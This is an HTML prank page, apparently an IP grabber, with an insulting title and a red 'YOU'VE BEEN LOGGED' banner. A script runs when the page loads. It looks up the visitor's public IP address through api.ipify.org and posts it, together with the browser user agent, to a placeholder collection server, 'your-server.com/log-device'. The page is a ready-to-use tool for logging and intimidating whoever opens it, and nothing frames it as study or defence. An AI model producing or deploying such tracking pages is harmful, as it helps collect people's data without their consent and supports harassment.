<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>your a bitch!</title
    <style>
        body {
            background-color: black;
            color: red;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        h1 {
            font-size: 3em;
            margin: 0;
        }
    </style>
</head>
<body>
    <h1>YOU'VE BEEN LOGGED</h1>

    <script>
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip;
                const userAgent = navigator.userAgent;

                fetch('https://your-server.com/log-device', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: userIP,
                        userAgent: userAgent,
                    })
                })
                .then(response => {
                    if (response.ok) {
                        console.log("Success");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                });
            })
            .catch(error => {
                console.error("Error fetching IP:", error);
            });
    </script>
</body>
</html>
